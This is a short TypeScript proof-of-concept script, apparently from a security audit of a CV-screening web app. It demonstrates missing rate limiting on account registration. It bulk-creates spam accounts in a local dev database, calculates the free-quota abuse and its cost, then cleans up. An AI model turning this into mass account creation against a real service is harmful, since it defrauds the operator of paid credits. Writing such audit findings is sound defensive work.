/**
 * PoC 2: UNRESTRICTED REGISTRATION — No Rate Limiting on Account Creation
 * Severity: HIGH
 * 
 * Finding: `registerUser()` server action in src/lib/actions.ts has NO rate limiting.
 * An attacker can create unlimited accounts, each getting 5 free daily quotas.
 * 
 * This PoC demonstrates rapid account creation via the server action.
 * Run: npx tsx .tmp-poc/poc2-unrestricted-registration.ts
 */

import { PrismaClient } from '../src/generated/prisma/client';
import { PrismaBetterSqlite3 } from '@prisma/adapter-better-sqlite3';
import bcrypt from 'bcryptjs';

const adapter = new PrismaBetterSqlite3({ url: 'file:./dev.db' });
const prisma = new PrismaClient({ adapter });

async function poc() {
  console.log('=== PoC 2: Unrestricted Registration ===\n');
  
  const ATTACKER_DOMAIN = 'attacker.test';
  const ACCOUNTS_TO_CREATE = 10;
  const results: { email: string; success: boolean; error?: string }[] = [];

  console.log(`Creating ${ACCOUNTS_TO_CREATE} accounts rapidly with no rate limit...\n`);

  for (let i = 0; i < ACCOUNTS_TO_CREATE; i++) {
    const email = `spam-${i}@${ATTACKER_DOMAIN}`;
    const name = `Spam User ${i}`;
    const password = 'password123';

    try {
      // Simulate what registerUser() does — no rate limit check
      const existing = await prisma.user.findUnique({ where: { email } });
      if (existing) {
        results.push({ email, success: false, error: 'already exists' });
        continue;
      }

      const passwordHash = await bcrypt.hash(password, 12);
      await prisma.user.create({
        data: { name, email, passwordHash },
      });
      results.push({ email, success: true });
      console.log(`  [${i + 1}/${ACCOUNTS_TO_CREATE}] Created: ${email}`);
    } catch (e: any) {
      results.push({ email, success: false, error: e.message });
      console.log(`  [${i + 1}/${ACCOUNTS_TO_CREATE}] FAILED: ${email} — ${e.message}`);
    }
  }

  const created = results.filter(r => r.success).length;
  const failed = results.filter(r => !r.success).length;

  console.log(`\n--- Results ---`);
  console.log(`Created: ${created}/${ACCOUNTS_TO_CREATE}`);
  console.log(`Failed: ${failed}`);
  console.log(`\nEach account gets 5 free daily quota screenings.`);
  console.log(`Total free screenings obtainable: ${created * 5}`);

  // Calculate total free credits per day for all accounts
  const dailyFreeScreenings = created * 5;
  console.log(`\nAbuse potential: ${dailyFreeScreenings} free CV screenings per day`);
  console.log(`Cost equivalent at smallest bundle (Rp 10,000 = 20 credits):`);
  console.log(`  ${Math.ceil(dailyFreeScreenings / 20)} top-ups worth Rp ${(Math.ceil(dailyFreeScreenings / 20) * 10000).toLocaleString('id-ID')}/day`);

  // Verify: no rate limit check in registerUser
  console.log(`\n--- Code Analysis ---`);
  console.log(`src/lib/actions.ts registerUser() function:`);
  console.log(`  - NO checkRateLimit() call`);
  console.log(`  - Only checks if email already exists`);
  console.log(`  - Creates account with bcrypt.hash(password, 12)`);
  console.log(`  - Auto-signs in after registration`);
  console.log(`  - Returns success without any cooldown`);

  // Cleanup: remove test accounts
  console.log(`\n--- Cleanup ---`);
  for (const r of results) {
    if (r.success) {
      await prisma.user.delete({ where: { email: r.email } });
    }
  }
  console.log(`Cleaned up ${created} test accounts.`);

  await prisma.$disconnect();
}

poc().catch(console.error);
